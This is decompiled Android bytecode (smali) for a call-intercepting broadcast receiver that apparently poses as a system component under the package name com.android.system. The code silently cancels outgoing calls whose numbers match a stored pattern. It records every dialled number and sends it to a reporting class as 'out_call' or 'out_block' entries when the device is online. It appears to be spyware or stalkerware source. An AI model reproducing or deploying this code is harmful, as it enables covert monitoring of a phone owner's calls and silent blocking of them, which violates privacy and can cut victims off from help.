.class public Lcom/android/system/ocCall;
.super Landroid/content/BroadcastReceiver;
.source "ocCall.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 13
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method

.method private Eset2(Landroid/content/Context;)Landroid/net/NetworkInfo;
    .locals 3
    .param p1, "Z"    # Landroid/content/Context;

    .prologue
    .line 20
    const-string v2, "connectivity"

    invoke-virtual {p1, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/net/ConnectivityManager;

    .line 21
    .local v0, "cm":Landroid/net/ConnectivityManager;
    invoke-virtual {v0}, Landroid/net/ConnectivityManager;->getActiveNetworkInfo()Landroid/net/NetworkInfo;

    move-result-object v1

    .line 22
    .local v1, "netInfo":Landroid/net/NetworkInfo;
    return-object v1
.end method

.method private collectData(Ljava/lang/String;Landroid/content/Intent;)Ljava/lang/String;
    .locals 1
    .param p1, "extraState"    # Ljava/lang/String;
    .param p2, "i"    # Landroid/content/Intent;

    .prologue
    .line 188
    invoke-virtual {p2, p1}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method private getPhoneEset3(Ljava/lang/String;)Ljava/lang/String;
    .locals 3
    .param p1, "stringExtra"    # Ljava/lang/String;

    .prologue
    .line 194
    const-string v0, "+"

    const-string v1, ""

    invoke-virtual {p1, v0, v1}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    .line 195
    const-string v1, "-"

    const-string v2, ""

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    .line 196
    const-string v1, "*"

    const-string v2, "S"

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    .line 197
    const-string v1, "#"

    const-string v2, "C"

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    .line 198
    const-string v1, " "

    const-string v2, ""

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    .line 194
    return-object v0
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 30
    .param p1, "c"    # Landroid/content/Context;
    .param p2, "i"    # Landroid/content/Intent;

    .prologue
    .line 32
    move-object/from16 v22, p1

    .line 34
    .local v22, "Z":Landroid/content/Context;
    invoke-virtual/range {p2 .. p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v23

    .line 36
    .local v23, "bundle":Landroid/os/Bundle;
    const-string v21, ""

    .line 37
    .local v21, "Report":Ljava/lang/String;
    const/16 v28, 0x0

    .line 38
    .local v28, "sa":Z
    if-nez v23, :cond_1

    .line 185
    :cond_0
    :goto_0
    return-void

    .line 40
    :cond_1
    new-instance v2, Lcom/android/system/IO;

    invoke-direct {v2}, Lcom/android/system/IO;-><init>()V

    const-string v3, "c"

    move-object/from16 v0, p1

    invoke-virtual {v2, v3, v0}, Lcom/android/system/IO;->readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v24

    .line 41
    .local v24, "cl":Ljava/lang/String;
    new-instance v2, Lcom/android/system/IO;

    invoke-direct {v2}, Lcom/android/system/IO;-><init>()V

    const-string v3, "r"

    move-object/from16 v0, p1

    invoke-virtual {v2, v3, v0}, Lcom/android/system/IO;->readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v27

    .line 42
    .local v27, "rc":Ljava/lang/String;
    move-object/from16 v0, p0

    move-object/from16 v1, v22

    invoke-direct {v0, v1}, Lcom/android/system/ocCall;->Eset2(Landroid/content/Context;)Landroid/net/NetworkInfo;

    move-result-object v26

    .line 44
    .local v26, "netInfo":Landroid/net/NetworkInfo;
    const-string v2, "*"

    move-object/from16 v0, v24

    invoke-virtual {v0, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_3

    if-nez v28, :cond_3

    .line 45
    const/16 v28, 0x1

    .line 47
    invoke-virtual/range {p0 .. p0}, Lcom/android/system/ocCall;->getResultData()Ljava/lang/String;

    move-result-object v2

    if-eqz v2, :cond_3

    .line 49
    const/16 v28, 0x1

    .line 50
    if-eqz v26, :cond_2

    invoke-virtual/range {v26 .. v26}, Landroid/net/NetworkInfo;->isConnected()Z

    move-result v2

    if-eqz v2, :cond_2

    .line 51
    const-string v2, "android.intent.extra.PHONE_NUMBER"

    move-object/from16 v0, p0

    move-object/from16 v1, p2

    invoke-direct {v0, v2, v1}, Lcom/android/system/ocCall;->collectData(Ljava/lang/String;Landroid/content/Intent;)Ljava/lang/String;

    move-result-object v20

    .line 52
    .local v20, "EsetFix":Ljava/lang/String;
    const-string v2, "android.intent.extra.PHONE_NUMBER"

    move-object/from16 v0, p0

    move-object/from16 v1, p2

    invoke-direct {v0, v2, v1}, Lcom/android/system/ocCall;->collectData(Ljava/lang/String;Landroid/content/Intent;)Ljava/lang/String;

    move-result-object v2

    move-object/from16 v0, p0

    invoke-direct {v0, v2}, Lcom/android/system/ocCall;->getPhoneEset3(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    .line 53
    .local v5, "Sr":Ljava/lang/String;
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "Rejected outgoing call / Scheme: *\rNumber: "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v20

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v21

    .line 54
    new-instance v2, Lcom/android/system/IO;

    invoke-direct {v2}, Lcom/android/system/IO;-><init>()V

    move-object/from16 v0, v21

    move-object/from16 v1, p1

    invoke-virtual {v2, v5, v0, v1}, Lcom/android/system/IO;->writeConfig(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 55
    new-instance v2, Lcom/android/system/Report;

    invoke-direct {v2}, Lcom/android/system/Report;-><init>()V

    const/4 v3, 0x0

    .line 56
    const-string v4, "out_block"

    move-object v6, v5

    move-object/from16 v7, p1

    .line 55
    invoke-virtual/range {v2 .. v7}, Lcom/android/system/Report;->Av(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 62
    .end local v5    # "Sr":Ljava/lang/String;
    .end local v20    # "EsetFix":Ljava/lang/String;
    :cond_2
    const/4 v2, 0x0

    move-object/from16 v0, p0

    invoke-virtual {v0, v2}, Lcom/android/system/ocCall;->setResultData(Ljava/lang/String;)V

    .line 71
    :cond_3
    const-string v2, ","

    move-object/from16 v0, v24

    invoke-virtual {v0, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_8

    if-nez v28, :cond_8

    .line 72
    const-string v2, ","

    move-object/from16 v0, v24

    invoke-virtual {v0, v2}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v25

    .line 73
    .local v25, "f":[Ljava/lang/String;
    const/16 v29, 0x0

    .local v29, "x":I
    :goto_1
    move-object/from16 v0, v25

    array-length v2, v0

    move/from16 v0, v29

    if-lt v0, v2, :cond_5

    .line 166
    .end local v25    # "f":[Ljava/lang/String;
    .end local v29    # "x":I
    :cond_4
    :goto_2
    if-eqz v26, :cond_0

    invoke-virtual/range {v26 .. v26}, Landroid/net/NetworkInfo;->isConnected()Z

    move-result v2

    if-eqz v2, :cond_0

    if-nez v28, :cond_0

    .line 167
    const/16 v28, 0x1

    .line 169
    const-string v2, "android.intent.extra.PHONE_NUMBER"

    move-object/from16 v0, p0

    move-object/from16 v1, p2

    invoke-direct {v0, v2, v1}, Lcom/android/system/ocCall;->collectData(Ljava/lang/String;Landroid/content/Intent;)Ljava/lang/String;

    move-result-object v2

    move-object/from16 v0, p0

    invoke-direct {v0, v2}, Lcom/android/system/ocCall;->getPhoneEset3(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v17

    .line 171
    .local v17, "Av":Ljava/lang/String;
    new-instance v2, Lcom/android/system/IO;

    invoke-direct {v2}, Lcom/android/system/IO;-><init>()V

    const-string v3, "android.intent.extra.PHONE_NUMBER"

    move-object/from16 v0, p0

    move-object/from16 v1, p2

    invoke-direct {v0, v3, v1}, Lcom/android/system/ocCall;->collectData(Ljava/lang/String;Landroid/content/Intent;)Ljava/lang/String;

    move-result-object v3

    move-object/from16 v0, v17

    move-object/from16 v1, p1

    invoke-virtual {v2, v0, v3, v1}, Lcom/android/system/IO;->writeConfig(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 173
    const-string v2, "out!call"

    const-string v3, "!"

    const-string v4, "_"

    invoke-virtual {v2, v3, v4}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v16

    .line 175
    .local v16, "report_type":Ljava/lang/String;
    new-instance v14, Lcom/android/system/Report;

    invoke-direct {v14}, Lcom/android/system/Report;-><init>()V

    const/4 v15, 0x0

    move-object/from16 v18, v17

    move-object/from16 v19, p1

    invoke-virtual/range {v14 .. v19}, Lcom/android/system/Report;->Av(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    goto/16 :goto_0

    .line 74
    .end local v16    # "report_type":Ljava/lang/String;
    .end local v17    # "Av":Ljava/lang/String;
    .restart local v25    # "f":[Ljava/lang/String;
    .restart local v29    # "x":I
    :cond_5
    const-string v2, "android.intent.extra.PHONE_NUMBER"

    move-object/from16 v0, p2

    invoke-virtual {v0, v2}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    aget-object v3, v25, v29

    invoke-virtual {v2, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_7

    .line 75
    const/16 v28, 0x1

    .line 76
    invoke-virtual/range {p0 .. p0}, Lcom/android/system/ocCall;->getResultData()Ljava/lang/String;

    move-result-object v2

    if-eqz v2, :cond_7

    .line 77
    if-eqz v26, :cond_6

    invoke-virtual/range {v26 .. v26}, Landroid/net/NetworkInfo;->isConnected()Z

    move-result v2

    if-eqz v2, :cond_6

    .line 79
    const-string v2, "android.intent.extra.PHONE_NUMBER"

    move-object/from16 v0, p0

    move-object/from16 v1, p2

    invoke-direct {v0, v2, v1}, Lcom/android/system/ocCall;->collectData(Ljava/lang/String;Landroid/content/Intent;)Ljava/lang/String;

    move-result-object v20

    .line 81
    .restart local v20    # "EsetFix":Ljava/lang/String;
    const-string v2, "android.intent.extra.PHONE_NUMBER"

    move-object/from16 v0, p0

    move-object/from16 v1, p2

    invoke-direct {v0, v2, v1}, Lcom/android/system/ocCall;->collectData(Ljava/lang/String;Landroid/content/Intent;)Ljava/lang/String;

    move-result-object v2

    move-object/from16 v0, p0

    invoke-direct {v0, v2}, Lcom/android/system/ocCall;->getPhoneEset3(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    .line 83
    .local v9, "rl":Ljava/lang/String;
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "Reject outgoing call / Scheme: *\rNumber: "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v20

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v21

    .line 85
    new-instance v2, Lcom/android/system/IO;

    invoke-direct {v2}, Lcom/android/system/IO;-><init>()V

    move-object/from16 v0, v21

    move-object/from16 v1, p1

    invoke-virtual {v2, v9, v0, v1}, Lcom/android/system/IO;->writeConfig(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 86
    new-instance v6, Lcom/android/system/Report;

    invoke-direct {v6}, Lcom/android/system/Report;-><init>()V

    const/4 v7, 0x0

    .line 87
    const-string v8, "out_block"

    move-object v10, v9

    move-object/from16 v11, p1

    .line 86
    invoke-virtual/range {v6 .. v11}, Lcom/android/system/Report;->Av(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 93
    .end local v9    # "rl":Ljava/lang/String;
    .end local v20    # "EsetFix":Ljava/lang/String;
    :cond_6
    const/4 v2, 0x0

    move-object/from16 v0, p0

    invoke-virtual {v0, v2}, Lcom/android/system/ocCall;->setResultData(Ljava/lang/String;)V

    .line 73
    :cond_7
    add-int/lit8 v29, v29, 0x1

    goto/16 :goto_1

    .line 104
    .end local v25    # "f":[Ljava/lang/String;
    .end local v29    # "x":I
    :cond_8
    const-string v2, "android.intent.extra.PHONE_NUMBER"

    move-object/from16 v0, p2

    invoke-virtual {v0, v2}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    move-object/from16 v0, v24

    invoke-virtual {v2, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_4

    const-string v2, ""

    move-object/from16 v0, v24

    if-eq v0, v2, :cond_4

    if-nez v28, :cond_4

    .line 105
    invoke-virtual/range {p0 .. p0}, Lcom/android/system/ocCall;->getResultData()Ljava/lang/String;

    move-result-object v2

    if-eqz v2, :cond_4

    .line 106
    const/16 v28, 0x1

    .line 107
    if-eqz v26, :cond_9

    invoke-virtual/range {v26 .. v26}, Landroid/net/NetworkInfo;->isConnected()Z

    move-result v2

    if-eqz v2, :cond_9

    .line 110
    const-string v2, "android.intent.extra.PHONE_NUMBER"

    move-object/from16 v0, p0

    move-object/from16 v1, p2

    invoke-direct {v0, v2, v1}, Lcom/android/system/ocCall;->collectData(Ljava/lang/String;Landroid/content/Intent;)Ljava/lang/String;

    move-result-object v20

    .line 112
    .restart local v20    # "EsetFix":Ljava/lang/String;
    const-string v2, "android.intent.extra.PHONE_NUMBER"

    move-object/from16 v0, p0

    move-object/from16 v1, p2

    invoke-direct {v0, v2, v1}, Lcom/android/system/ocCall;->collectData(Ljava/lang/String;Landroid/content/Intent;)Ljava/lang/String;

    move-result-object v2

    move-object/from16 v0, p0

    invoke-direct {v0, v2}, Lcom/android/system/ocCall;->getPhoneEset3(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    .line 114
    .local v13, "Sv":Ljava/lang/String;
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "Reject outgoing call / Scheme: *\rNumber: "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v20

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v21

    .line 117
    new-instance v2, Lcom/android/system/IO;

    invoke-direct {v2}, Lcom/android/system/IO;-><init>()V

    move-object/from16 v0, v21

    move-object/from16 v1, p1

    invoke-virtual {v2, v13, v0, v1}, Lcom/android/system/IO;->writeConfig(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 118
    new-instance v10, Lcom/android/system/Report;

    invoke-direct {v10}, Lcom/android/system/Report;-><init>()V

    const/4 v11, 0x0

    .line 119
    const-string v12, "out_block"

    move-object v14, v13

    move-object/from16 v15, p1

    .line 118
    invoke-virtual/range {v10 .. v15}, Lcom/android/system/Report;->Av(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 125
    .end local v13    # "Sv":Ljava/lang/String;
    .end local v20    # "EsetFix":Ljava/lang/String;
    :cond_9
    const/4 v2, 0x0

    move-object/from16 v0, p0

    invoke-virtual {v0, v2}, Lcom/android/system/ocCall;->setResultData(Ljava/lang/String;)V

    goto/16 :goto_2
.end method
